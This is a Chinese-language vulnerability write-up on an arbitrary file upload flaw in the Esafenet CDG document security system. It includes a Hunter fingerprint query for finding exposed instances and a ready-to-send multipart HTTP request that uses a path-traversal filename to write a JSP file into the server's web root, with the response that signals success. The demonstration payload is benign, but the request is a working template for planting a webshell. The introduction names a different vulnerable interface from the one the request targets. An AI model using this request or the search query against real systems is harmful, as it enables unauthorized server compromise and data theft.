# 亿赛通电子文档安全管理系统syn_user_policy任意文件上传漏洞

# 一、漏洞简介
 亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通部门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口处存在任意文件上传漏洞，未经授权的攻击者可通过此漏洞上传恶意后门文件，从而获取服务器权限。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/u9Ky1y2wQUawV_F0/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-968665.png)

# 四、漏洞复现
```plain
POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 287
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysebeiskw
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundarysebeiskw
Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\test.jsp"

<% out.println(1111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundarysebeiskw--
```

![1699887100367-6d125344-50c6-4d4f-ab9f-efa399cc55a1.png](./img/u9Ky1y2wQUawV_F0/1699887100367-6d125344-50c6-4d4f-ab9f-efa399cc55a1-779465.png)

<font style="color:rgb(51, 51, 51);">服务器回显</font><font style="color:rgb(232, 62, 140);background-color:rgb(246, 246, 246);">{"result":"xmlFail","msg":"操作失败"}</font><font style="color:rgb(51, 51, 51);">则上传成功</font>

<font style="color:rgb(51, 51, 51);">上传文件位置</font>

```plain
/test.jsp 
```

![1699887140558-b9f3503d-d25c-40cf-82c8-04c185296eed.png](./img/u9Ky1y2wQUawV_F0/1699887140558-b9f3503d-d25c-40cf-82c8-04c185296eed-535457.png)



> 更新: 2024-04-20 22:01:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zkvw8ryeiekwzudv>